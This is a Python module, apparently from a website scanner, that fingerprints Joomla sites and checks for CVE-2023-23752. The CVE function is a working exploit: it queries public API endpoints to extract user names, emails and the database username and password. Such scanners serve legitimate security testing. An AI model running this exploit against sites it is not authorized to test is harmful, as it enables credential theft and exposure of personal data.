import xml.etree.ElementTree as ET
from urllib.parse import urljoin

import aiohttp
from bs4 import BeautifulSoup

from website_scanner.techs import TechnologyModule


class Joomla(TechnologyModule):

    def __init__(self):
        super().__init__("joomla")

    async def get_version(self, session: aiohttp.ClientSession, args):
        async with session.get(urljoin(args.url, "/administrator/manifests/files/joomla.xml")) as response:
            data = await response.text()
            root = ET.ElementTree(ET.fromstring(data))
            version_tag = root.find("version")
            if version_tag is not None:
                return version_tag.text

    async def get_templates(self, session: aiohttp.ClientSession, args):
        templates = set()
        async with session.get(args.url) as response:
            html = await response.text()
            soup = BeautifulSoup(html, "html.parser")
            for link_tag in soup.find_all("link", attrs={"href": True}):
                href = link_tag.attrs["href"]
                if href.startswith("/media/templates/site/"):
                    templates.add(href.split("/")[4])
        return list(templates) if templates else None

    async def cve_2023_23752(self, session: aiohttp.ClientSession, args):
        results = dict()
        async with session.get(urljoin(args.url, "/api/index.php/v1/users?public=true")) as response:
            if response.status == 200:
                results["users"] = []
                data = await response.json()
                for element in data["data"]:
                    results["users"].append({
                        "id": element["attributes"]["id"],
                        "username": element["attributes"]["username"],
                        "email": element["attributes"]["email"],
                    })

        async with session.get(urljoin(args.url, "/api/index.php/v1/config/application?public=true")) as response:
            if response.status == 200:
                results["config"] = dict()
                data = await response.json()
                for element in data["data"]:
                    if "user" in element["attributes"]:
                        results["config"]["username"] = element["attributes"]["user"]
                    if "password" in element["attributes"]:
                        results["config"]["password"] = element["attributes"]["password"]

        return results if results else None

    async def run(self, session: aiohttp.ClientSession, args):
        results = dict()

        version = await self.get_version(session, args)
        if version is not None:
            results["version"] = version

        templates = await self.get_templates(session, args)
        if templates is not None:
            results["templates"] = templates

        cve_2023_23752_result = await self.cve_2023_23752(session, args)
        if cve_2023_23752_result is not None:
            results["cve-2023-23752"] = cve_2023_23752_result

        return results if results else None
